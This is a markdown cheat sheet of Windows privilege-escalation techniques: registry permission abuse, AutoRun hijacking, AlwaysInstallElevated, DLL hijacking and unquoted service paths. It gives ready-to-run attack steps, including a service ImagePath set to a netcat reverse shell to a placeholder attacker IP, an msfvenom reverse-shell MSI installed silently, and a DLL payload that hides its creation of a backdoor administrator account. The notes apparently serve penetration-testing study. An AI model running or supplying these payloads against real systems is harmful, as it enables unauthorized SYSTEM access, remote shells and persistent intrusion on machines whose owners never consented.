# Registry Escalation Vectors
**Concept:** Windows relies on the Registry for configuration. If a low-privileged user can modify specific registry keys (like service paths, autoruns, or installer settings), they can force the system to execute malicious code.
## 1. Weak Registry Permissions
**Vulnerability:** A service runs as SYSTEM, but its registry configuration (specifically `ImagePath`) is writable by a standard user. **Exploitation:**
1. **Enumeration:** Use AccessChk to find writable service keys.
```powershell
accesschk.exe /accepteula -kvuqsw hklm\System\CurrentControlSet\services
```
2. **Modification:** Change the `ImagePath` to point to your binary (e.g., Netcat or a reverse shell exe).
```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Temp\nc.exe -e cmd.exe <ATTACKER_IP> 443"
```
3. **Trigger:** Restart the service (or wait for reboot).
```powershell
sc start ModelManagerService
```
## 2. AutoRun Hijacking
**Vulnerability:** Programs configured to start automatically (AutoRuns) are often located in writable directories or have weak registry permissions. 
**Enumeration:**
```powershell
# List Startup commands
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

**Exploitation:**
- If the `command` path is writable: Replace the binary.
- If the `Location` registry key is writable: Change the path to your payload.
## 3. AlwaysInstallElevated
**Vulnerability:** A registry setting that allows non-administrators to install Microsoft Installer (`.msi`) packages with elevated (SYSTEM) privileges. **Enumeration:**
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
- **Condition:** Both queries must return `0x1`.

**Exploitation:**
1. **Generate MSI:** Create a malicious MSI payload.
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o update.msi
```

2. **Install:** Execute the MSI on the target.
```powershell
msiexec /quiet /qn /i C:\Temp\update.msi
```
# DLL Hijacking
**Concept:** When an application loads a Dynamic Link Library (DLL), it follows a specific search order. If an attacker can place a malicious DLL in a directory searched _before_ the legitimate DLL (or if the DLL is missing), the application loads the malicious code.
## 1. DLL Search Order Hijacking
**Search Order (Standard):**
1. Directory from which the application loaded.
2. System directory (`C:\Windows\System32`).
3. 16-bit System directory.
4. Windows directory (`C:\Windows`).
5. Current working directory (CWD).
6. Directories in the `PATH` environment variable.

**Exploitation:**
- Identify a privileged process (e.g., a service or scheduled task) executing from a writable directory.
- Identify a DLL it attempts to load (e.g., `userenv.dll`, `version.dll`).
- Place your malicious DLL in that same writable directory.
## 2. Phantom DLLs (Missing Libraries)

**Vulnerability:** Applications often try to load DLLs that do not exist (e.g., legacy libraries or debug DLLs). 
**Enumeration:**
- Use **Process Monitor (ProcMon)**.
- Filter: `Process Name is <target.exe>` AND `Result is NAME NOT FOUND` AND `Path ends with .dll`.

**Exploitation:**
1. Find a "NAME NOT FOUND" DLL path that is writable (e.g., `C:\Program Files\App\debug.dll`).
2. Compile a malicious DLL (see C skeleton below).
3. Copy it to the location.
4. Restart the application/service.

**C Skeleton (DllMain):**
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Payload here:
        WinExec("cmd.exe /c net user hacker Pwnd123! /add", SW_HIDE);
        WinExec("cmd.exe /c net localgroup administrators hacker /add", SW_HIDE);
        break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
```
## 3. Unquoted Service Paths (Bonus Interaction)
This vector is a hybrid of Service Abuse and DLL/Exe hijacking. 
**Vulnerability:** Service path contains spaces and lacks quotes: `C:\Program Files\My Service\service.exe`. 
**Mechanism:** Windows parses this from left to right:
1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My Service\service.exe` 
	1. **Exploitation:** Place a malicious binary named `Program.exe` in `C:\` or `My.exe` in `C:\Program Files\`.